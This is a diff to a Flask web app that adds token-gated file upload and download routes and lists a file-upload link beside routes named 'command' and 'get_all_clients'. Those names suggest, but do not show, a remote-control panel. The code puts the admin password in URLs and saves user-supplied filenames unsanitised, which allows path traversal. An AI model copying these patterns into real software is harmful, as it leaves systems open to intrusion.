@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, redirect, send_from_directory
 from suggest_lib import Suggested_pass
 from multiprocessing import Process
 import csv
@@ -96,6 +96,32 @@ app = Flask(__name__)
 def my_form():
     return render_template("index.html")
 
+@app.route(f'/file_upload/{admin_password}', methods=['GET'])
+def upload_fil():
+   return render_template('file_upload.html',token=f"/uploader/{admin_token}",data=glob.glob("./uploads/*.*"))
+
+@app.route('/uploader/'+admin_token, methods = ['POST'])
+def success():
+    if request.method == 'POST':
+        f = request.files['file']
+        if f.filename=="":
+            return render_template("file_upload.html",error="Choose a file",data=glob.glob("./uploads/*.*"),token=f"/uploader/{admin_token}")
+        compteur = 0
+        while "./uploads/"+f.filename in glob.glob("./uploads/*.*"):
+            compteur +=1
+            f.filename = f.filename.split(".")[0]+str(compteur)+"."+f.filename.split(".")[1]
+        f.save("./uploads/"+f.filename)
+        return render_template("file_upload.html",error="Uploaded",data=glob.glob("./uploads/*.*"),token=f"/uploader/{admin_token}")
+
+@app.route("/download/",methods=["GET"])
+def down():
+    if request.args.get('file'):
+        if "./uploads/"+request.args.get('file') in glob.glob("./uploads/*.*"):
+            return send_from_directory(directory="./uploads/", filename=request.args.get('file'))
+        else:
+            return ""
+    return ""
+
 @app.route("/get_id/")
 def get_id():
     with open("id.txt",'r') as file:
@@ -175,7 +201,7 @@ def get_all():
 
 @app.route("/account/",methods=["GET","POST"])
 def account():
-    global host1
+    host1 = "0.0.0.0"
     global admin_hash
     global admin_password
     global admin_token
@@ -184,7 +210,8 @@ def account():
     command_p = f"http://{host1}/command/{admin_token}?password={admin_password}"
     client_p = f"http://{host1}/get_all_clients/{admin_token}?password={admin_password}"
     live_feedb = f"http://{host1}/feedback/{admin_token}?password={admin_password}"
-    content = enumerate([command_p,client_p,live_feedb])
+    file_upl = f'http://{host1}/file_upload/{admin_password}?password={admin_password}'
+    content = enumerate([command_p,client_p,live_feedb,file_upl])
     if fail_counter == 3:
         return render_template("admin.html",error_code=f"Acces Blocked, max attempts excelled.")
     if request.method == "POST":
